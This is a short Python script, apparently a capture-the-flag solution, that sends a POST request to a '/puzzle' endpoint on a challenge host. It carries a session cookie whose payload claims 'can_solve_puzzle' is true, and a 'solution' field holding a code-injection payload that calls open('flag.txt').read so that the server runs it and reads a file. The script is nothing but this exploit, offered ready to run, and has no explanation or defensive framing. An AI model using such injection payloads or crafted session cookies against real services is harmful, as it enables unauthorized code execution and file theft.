import requests

url = "https://headlututkaki.csuc.site/puzzle"

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "session=eyJjYW5fc29sdmVfcHV6emxlIjp0cnVlfQ.Zs_Qhg._iluX_9mydxmOAzRKY5bwVho4nw",
    "User-Agent": "pacar-zee"  # Ganti dengan IP yang sesuai jika diperlukan
}

data = {
    "solution": "open('flag.txt').read"
}

response = requests.post(url, headers=headers, data=data)

print(f"Status Code: {response.status_code}")
print(f"Response Text: {response.text}")
